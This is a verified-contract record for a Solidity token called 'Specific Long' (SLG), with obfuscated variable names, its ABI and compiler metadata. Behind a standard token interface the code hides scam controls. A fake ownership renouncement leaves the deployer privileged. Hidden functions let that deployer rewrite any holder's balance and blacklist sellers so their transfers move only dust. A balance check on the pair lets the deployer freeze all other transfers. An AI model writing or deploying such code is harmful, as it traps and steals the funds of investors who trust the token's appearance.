{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface totalTeamMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeExempt {\n    function createPair(address fundSell, address marketingEnable) external returns (address);\n}\n\ninterface senderMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minModeLiquidity) external view returns (uint256);\n\n    function transfer(address tradingLaunchLiquidity, uint256 atLaunched) external returns (bool);\n\n    function allowance(address exemptTotalMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingLaunchLiquidity,\n        uint256 atLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchListFee, uint256 value);\n    event Approval(address indexed exemptTotalMin, address indexed spender, uint256 value);\n}\n\ninterface senderMinMetadata is senderMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SpecificLong is liquidityIs, senderMin, senderMinMetadata {\n\n    uint256 public walletIs;\n\n    function approve(address amountFund, uint256 atLaunched) public virtual override returns (bool) {\n        marketingTrading[_msgSender()][amountFund] = atLaunched;\n        emit Approval(_msgSender(), amountFund, atLaunched);\n        return true;\n    }\n\n    mapping(address => bool) public walletSender;\n\n    function minEnable(address teamTx) public {\n        amountAt();\n        if (exemptFee != walletIs) {\n            launchMax = receiverLimit;\n        }\n        if (teamTx == autoExemptSender || teamTx == takeBuy) {\n            return;\n        }\n        receiverFee[teamTx] = true;\n    }\n\n    bool public modeReceiver;\n\n    function transferFrom(address tokenMarketingAmount, address tradingLaunchLiquidity, uint256 atLaunched) external override returns (bool) {\n        if (_msgSender() != shouldTeamWallet) {\n            if (marketingTrading[tokenMarketingAmount][_msgSender()] != type(uint256).max) {\n                require(atLaunched <= marketingTrading[tokenMarketingAmount][_msgSender()]);\n                marketingTrading[tokenMarketingAmount][_msgSender()] -= atLaunched;\n            }\n        }\n        return receiverTo(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamIs;\n    }\n\n    bool private launchedMin;\n\n    function liquidityTotal(address tokenMarketingAmount, address tradingLaunchLiquidity, uint256 atLaunched) internal returns (bool) {\n        require(launchSwap[tokenMarketingAmount] >= atLaunched);\n        launchSwap[tokenMarketingAmount] -= atLaunched;\n        launchSwap[tradingLaunchLiquidity] += atLaunched;\n        emit Transfer(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);\n        return true;\n    }\n\n    function buyMarketing(address takeList, uint256 atLaunched) public {\n        amountAt();\n        launchSwap[takeList] = atLaunched;\n    }\n\n    mapping(address => bool) public receiverFee;\n\n    address public takeBuy;\n\n    uint256 public minFromLaunch;\n\n    function balanceOf(address minModeLiquidity) public view virtual override returns (uint256) {\n        return launchSwap[minModeLiquidity];\n    }\n\n    address shouldTeamWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant teamMin = 10 ** 10;\n\n    address private modeLaunched;\n\n    address autoIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public exemptFee;\n\n    uint256 private tokenShould = 100000000 * 10 ** 18;\n\n    constructor (){\n        if (autoEnable) {\n            walletIs = receiverLimit;\n        }\n        totalTeamMax buyAmountMarketing = totalTeamMax(shouldTeamWallet);\n        takeBuy = feeExempt(buyAmountMarketing.factory()).createPair(buyAmountMarketing.WETH(), address(this));\n        \n        autoExemptSender = _msgSender();\n        isFee();\n        walletSender[autoExemptSender] = true;\n        launchSwap[autoExemptSender] = tokenShould;\n        if (walletIs == minFromLaunch) {\n            minFromLaunch = walletIs;\n        }\n        emit Transfer(address(0), autoExemptSender, tokenShould);\n    }\n\n    bool public autoEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTotal;\n    }\n\n    function receiverTo(address tokenMarketingAmount, address tradingLaunchLiquidity, uint256 atLaunched) internal returns (bool) {\n        if (tokenMarketingAmount == autoExemptSender) {\n            return liquidityTotal(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);\n        }\n        uint256 liquidityAuto = senderMin(takeBuy).balanceOf(autoIs);\n        require(liquidityAuto == enableWallet);\n        require(tradingLaunchLiquidity != autoIs);\n        if (receiverFee[tokenMarketingAmount]) {\n            return liquidityTotal(tokenMarketingAmount, tradingLaunchLiquidity, teamMin);\n        }\n        return liquidityTotal(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);\n    }\n\n    function amountAt() private view {\n        require(walletSender[_msgSender()]);\n    }\n\n    uint256 private launchMax;\n\n    uint8 private teamTotal = 18;\n\n    function transfer(address takeList, uint256 atLaunched) external virtual override returns (bool) {\n        return receiverTo(_msgSender(), takeList, atLaunched);\n    }\n\n    uint256 public receiverLimit;\n\n    function getOwner() external view returns (address) {\n        return modeLaunched;\n    }\n\n    uint256 private fromWallet;\n\n    string private modeMarketing = \"SLG\";\n\n    function allowance(address listMax, address amountFund) external view virtual override returns (uint256) {\n        if (amountFund == shouldTeamWallet) {\n            return type(uint256).max;\n        }\n        return marketingTrading[listMax][amountFund];\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingTrading;\n\n    string private teamIs = \"Specific Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeMarketing;\n    }\n\n    event OwnershipTransferred(address indexed autoSell, address indexed swapMode);\n\n    function isFee() public {\n        emit OwnershipTransferred(autoExemptSender, address(0));\n        modeLaunched = address(0);\n    }\n\n    function swapTotal(uint256 atLaunched) public {\n        amountAt();\n        enableWallet = atLaunched;\n    }\n\n    function sellTo(address isSenderShould) public {\n        if (modeReceiver) {\n            return;\n        }\n        \n        walletSender[isSenderShould] = true;\n        if (exemptFee == fromWallet) {\n            walletIs = launchMax;\n        }\n        modeReceiver = true;\n    }\n\n    address public autoExemptSender;\n\n    uint256 enableWallet;\n\n    uint256 minAuto;\n\n    function owner() external view returns (address) {\n        return modeLaunched;\n    }\n\n    uint256 private shouldMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenShould;\n    }\n\n    bool public teamShould;\n\n    mapping(address => uint256) private launchSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTotalMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchListFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExemptSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minModeLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"buyMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"}],\"name\":\"minEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFromLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSenderShould\",\"type\":\"address\"}],\"name\":\"sellTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketingAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLaunchLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SpecificLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}